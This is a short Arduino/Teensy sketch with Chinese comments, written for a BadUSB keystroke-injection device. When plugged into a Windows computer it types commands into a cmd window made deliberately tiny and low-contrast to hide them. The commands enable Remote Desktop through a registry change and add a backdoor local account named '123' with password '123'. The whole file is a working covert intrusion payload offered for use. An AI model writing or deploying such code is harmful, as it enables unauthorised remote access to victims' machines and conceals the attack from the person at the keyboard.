void setup() { //初始化，这里的代码只执行一次
    delay(5000); //设置延时，让系统有足够的时间识别烧鹅，防止后续代码执行错乱。
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); // 按下Win键
    Keyboard.set_key1(KEY_R); // 同时按下R键
    Keyboard.send_now(); // 发送Win+R
    delay(100);
    Keyboard.print("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
    //开启极小的CMD窗口，设置文字和背景对比度尽可能相近，达到隐藏输入的目的
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(300);
    Keyboard.println("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"); //开启3389
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.println("net user 123 123 /add"); //添加帐户
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(500);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.set_modifier(MODIFIERKEY_ALT);
    Keyboard.set_key1(KEY_SPACE);
    Keyboard.set_key2(KEY_C);
    Keyboard.send_now();
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.set_key2(0);
    Keyboard.send_now(); //关闭cmd
}
void loop() //循环，这里的代码无限循环
{
}